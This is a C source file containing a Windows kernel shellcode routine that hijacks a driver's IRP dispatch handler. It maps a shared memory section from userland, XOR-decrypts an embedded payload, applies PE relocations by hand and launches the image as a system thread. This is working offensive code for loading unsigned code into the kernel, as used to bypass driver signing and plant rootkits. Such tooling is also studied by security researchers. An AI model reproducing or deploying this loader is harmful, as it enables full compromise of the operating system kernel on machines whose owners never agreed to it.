
/*
* ScDispatchRoutineV1
*
* Purpose:
*
* Bootstrap shellcode variant 1.
* Read image from shared section, process relocs and run it in allocated system thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV1(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    HANDLE                          hThread;
    OBJECT_ATTRIBUTES               obja;
    ULONG_PTR                       Image, exbuffer, pos;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chains;
    DWORD                           c, p, rsz, k;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL;
    SIZE_T                          ViewSize;

    PPAYLOAD_HEADER_V1              PayloadHeader;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
            SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V1*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);

                do {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                    --rsz;
                } while (rsz != 0);

                Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
                dosh = (PIMAGE_DOS_HEADER)Image;
                fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag) + PAGE_SIZE;

                if (exbuffer != 0) {

                    exbuffer &= ~(PAGE_SIZE - 1);

                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
                        if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
                        {
                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                                popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

                            rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                            delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                            c = 0;

                            while (c < rsz) {
                                p = sizeof(IMAGE_BASE_RELOCATION);
                                chains = (LPWORD)((PBYTE)rel + p);

                                while (p < rel->SizeOfBlock) {

                                    switch (*chains >> 12) {
                                    case IMAGE_REL_BASED_HIGHLOW:
                                        *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                                        break;
                                    case IMAGE_REL_BASED_DIR64:
                                        *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                                        break;
                                    }

                                    chains++;
                                    p += sizeof(WORD);
                                }

                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                            }
                        }

                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    isz >>= 3;
                    for (pos = 0; pos < isz; pos++)
                        ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];

                    //
                    // Create system thread with handler set to image entry point.
                    //
                    hThread = NULL;
                    InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

                    status = PayloadHeader->PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                        (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL);

                    if (NT_SUCCESS(status))
                        PayloadHeader->ZwClose(hThread);

                    //
                    // Save result.
                    //
                    PayloadHeader->IoStatus.Status = status;

                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(exbuffer)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
